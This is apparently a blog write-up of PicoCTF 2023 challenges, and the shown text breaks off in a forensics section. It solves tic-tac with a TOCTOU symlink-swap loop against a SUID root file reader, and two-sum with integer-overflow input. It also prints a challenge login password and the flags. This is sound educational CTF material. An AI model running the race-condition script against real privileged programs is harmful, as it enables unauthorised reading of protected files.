@@ -1,0 +1,2064 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named &ldquo;txtreader&rdquo; once connected. Login as ctf-player with the password, d137d16e\nUpon ssh into machine, we see txtreader binary and flag.txt file, however we don&rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for txtreader so that we might get a better idea on what&rsquo;s going on:\n">
+<title>PicoCTF_2023</title>
+
+<link rel='canonical' href='http://localhost:1313/p/picoctf_2023/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="PicoCTF_2023">
+<meta property='og:description' content="Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named &ldquo;txtreader&rdquo; once connected. Login as ctf-player with the password, d137d16e\nUpon ssh into machine, we see txtreader binary and flag.txt file, however we don&rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for txtreader so that we might get a better idea on what&rsquo;s going on:\n">
+<meta property='og:url' content='http://localhost:1313/p/picoctf_2023/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Forensics' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2023-03-28T21:15:25-05:00'/><meta property='article:modified_time' content='2023-03-28T21:15:25-05:00'/>
+<meta name="twitter:title" content="PicoCTF_2023">
+<meta name="twitter:description" content="Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named &ldquo;txtreader&rdquo; once connected. Login as ctf-player with the password, d137d16e\nUpon ssh into machine, we see txtreader binary and flag.txt file, however we don&rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for txtreader so that we might get a better idea on what&rsquo;s going on:\n">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#binary-exploitation">Binary Exploitation</a>
+      <ol>
+        <li><a href="#tic-tac">tic-tac</a>
+          <ol>
+            <li><a href="#potential-solution--reliable-race-fixing">Potential Solution&ndash;Reliable race fixing?</a></li>
+          </ol>
+        </li>
+        <li><a href="#two-sum">two-sum</a></li>
+      </ol>
+    </li>
+    <li><a href="#forensics">Forensics</a>
+      <ol>
+        <li><a href="#hideme">hideme</a></li>
+      </ol>
+    </li>
+    <li><a href="#general-skills">General Skills</a>
+      <ol>
+        <li><a href="#chrono">chrono</a></li>
+        <li><a href="#money-ware">money-ware</a></li>
+        <li><a href="#permissions">Permissions</a></li>
+        <li><a href="#repititions">Repititions</a></li>
+        <li><a href="#special">Special</a></li>
+        <li><a href="#specialer">Specialer</a></li>
+        <li><a href="#useless">Useless</a></li>
+      </ol>
+    </li>
+    <li><a href="#web">Web</a>
+      <ol>
+        <li><a href="#findme">findme</a></li>
+        <li><a href="#matchtheregex">MatchTheRegex</a></li>
+        <li><a href="#more_sqli">More_SQLi</a></li>
+        <li><a href="#soap">SOAP</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/picoctf_2023/">PicoCTF_2023</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 28, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    25 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="binary-exploitation">Binary Exploitation
+</h2><h3 id="tic-tac">tic-tac
+</h3><blockquote>
+<p>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. <code>ssh</code> to <code>saturn.picoctf.net:62983</code>, and run the binary named &ldquo;txtreader&rdquo; once connected. Login as <code>ctf-player</code> with the password, <code>d137d16e</code></p>
+</blockquote>
+<hr>
+<p>Upon ssh into machine, we see <code>txtreader</code> binary and flag.txt file, however we don&rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for <code>txtreader</code> so that we might get a better idea on what&rsquo;s going on:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">  
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fstream&gt;</span><span class="cp">  
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">  
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Usage: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;filename&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl"> <span class="n">std</span><span class="o">::</span><span class="n">ifstream</span> <span class="n">file</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="nc">stat</span> <span class="n">statbuf</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="c1">// Check the file&#39;s status information.  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: Could not retrieve file information&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="c1">// Check the file&#39;s owner.  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">if</span> <span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">!=</span> <span class="n">getuid</span><span class="p">())</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: you don&#39;t own this file&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="c1">// Read the contents of the file.  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">if</span> <span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">is_open</span><span class="p">())</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">line</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="k">while</span> <span class="p">(</span><span class="n">getline</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">line</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">     <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">line</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: Could not open file&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Essentially, the file first checks if the file exists, then checks if our permission to view the file. If we are allowed to view, it will read the file contents. It&rsquo;s also worth noting that <code>txtreader</code> has SUID bit set, allowing it to run as root when we use:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ls -l txtreader    
+</span></span><span class="line"><span class="cl">-rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or <strong>TOCTOU</strong> type of problem.
+<a class="link" href="https://youtu.be/HbCCrF9GOtQ"  target="_blank" rel="noopener"
+    >This video by John Hammond</a> covers a similar CTF challenge, and the solution can be done with the same approach.
+1. We will create our own file called <code>link</code> with touch, that we can read/write to.
+2. We will start <code>txtreader</code>, and tell it to read <code>link</code>, which is owned by us.
+3. <code>txtreader</code> will check the file, and confirm we have permission to read the file
+4. We will delete <code>link</code>, and create a new <code>link</code> file that is symlinked to flag.txt. Now when things want to interact with <code>link</code>, they are pointed to flag.txt
+5. <code>txtreader</code> will attempt to read <code>link</code>, except it now points to <code>flag.txt</code>. Since it already confirmed we have permissions, it will output the contents of <code>flag.txt</code>
+Since <code>txtreader</code> won&rsquo;t be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect.  Our human action speeds aren&rsquo;t nearly good enough, so what we can do is loop the action of swapping <code>link</code> , while also looping the run of <code>txtreader</code>. After enough runs, hopefully our action timings will line up and we can get the flag.
+Making the link loop, <code>linker.sh</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">while true
+</span></span><span class="line"><span class="cl">do
+</span></span><span class="line"><span class="cl">	rm link
+</span></span><span class="line"><span class="cl">	touch link
+</span></span><span class="line"><span class="cl">	rm link
+</span></span><span class="line"><span class="cl">	ln -s /home/ctf-player/flag.txt link
+</span></span><span class="line"><span class="cl">done
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setting up the linker loop and running <code>txtreader</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctf-player@pico-chall$ chmod +x linker.sh 
+</span></span><span class="line"><span class="cl">ctf-player@pico-chall$ ./linker.sh 
+</span></span><span class="line"><span class="cl">rm: cannot remove &#39;link&#39;: No such file or directory
+</span></span><span class="line"><span class="cl">^Z
+</span></span><span class="line"><span class="cl">[1]+  Stopped                 ./linker.sh
+</span></span><span class="line"><span class="cl">ctf-player@pico-chall$ bg 1
+</span></span><span class="line"><span class="cl">[1]+ ./linker.sh &amp;
+</span></span><span class="line"><span class="cl">ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">picoCTF{ToctoU_!s_3a5y_f482a247}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.</p>
+<p>picoCTF{ToctoU_!s_3a5y_f482a247}</p>
+<h4 id="potential-solution--reliable-race-fixing">Potential Solution&ndash;Reliable race fixing?
+</h4><p>It might be possible to &ldquo;fix&rdquo; the race for us, resulting in very reliable success of flag read. <a class="link" href="https://www.usenix.org/legacy/events/fast08/tech/full_papers/tsafrir/tsafrir_html/index.html"  target="_blank" rel="noopener"
+    >This post</a>  describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets.
+The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.</p>
+<p>While I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.</p>
+<h3 id="two-sum">two-sum
+</h3><blockquote>
+<p>Can you solve this? What two positive numbers can make this possible: <code>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</code> Enter them here <code>nc saturn.picoctf.net 56856</code>. <a class="link" href="https://artifacts.picoctf.net/c/455/flag.c"  target="_blank" rel="noopener"
+    >Source</a></p>
+</blockquote>
+<hr>
+<p>Essentially, we need a result where combining two positive numbers results in a smaller number. Sounds impossible, right? We can achieve this by causing an integer overflow, or inputting two large numbers that will overflow the &ldquo;limit&rdquo; and come back as a lower value result.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc saturn.picoctf.net 56856
+</span></span><span class="line"><span class="cl">n1 &gt; n1 + n2 OR n2&gt; n1 + n2
+</span></span><span class="line"><span class="cl">What two positive numbers can make this possible:
+</span></span><span class="line"><span class="cl">5555555555 5555555555
+</span></span><span class="line"><span class="cl">You have entered 1260588259 and 1260588259
+</span></span><span class="line"><span class="cl">You have an integer overflow
+</span></span><span class="line"><span class="cl">YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note that despite entering 5 555 555 555, it shows that we entered number 1 260 588 259. When we provided a number above the acceptable limit the value overflowed, and our result is something much lower. Now when the 1 260 588 259 is added together, it is still lower than our original input 5 555 555 555. Overflow achieved!</p>
+<p><code>picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}</code></p>
+<h2 id="forensics">Forensics
+</h2><h3 id="hideme">hideme
+</h3><blockquote>
+<p>Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye <a class="link" href="https://artifacts.picoctf.net/c/493/flag.png"  target="_blank" rel="noopener"
+    >here</a>.</p>
+</blockquote>
+<hr>
+<p>Downloading the file shows flag.png. Exiftool tells me there&rsquo;s more to this image than first shown:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">exiftool</span> <span class="n">flag</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">ExifTool</span> <span class="n">Version</span> <span class="n">Number</span>         <span class="p">:</span> <span class="mf">12.57</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">flag</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="ne">Directory</span>                       <span class="p">:</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Size</span>                       <span class="p">:</span> <span class="mi">43</span> <span class="n">kB</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Modification</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">24</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Access</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>           <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">50</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Inode</span> <span class="n">Change</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">14</span> <span class="mi">17</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">30</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Permissions</span>                <span class="p">:</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">PNG</span>
+</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Type</span> <span class="n">Extension</span>             <span class="p">:</span> <span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">MIME</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="ne">Image</span> <span class="n">Width</span>                     <span class="p">:</span> <span class="mi">512</span>
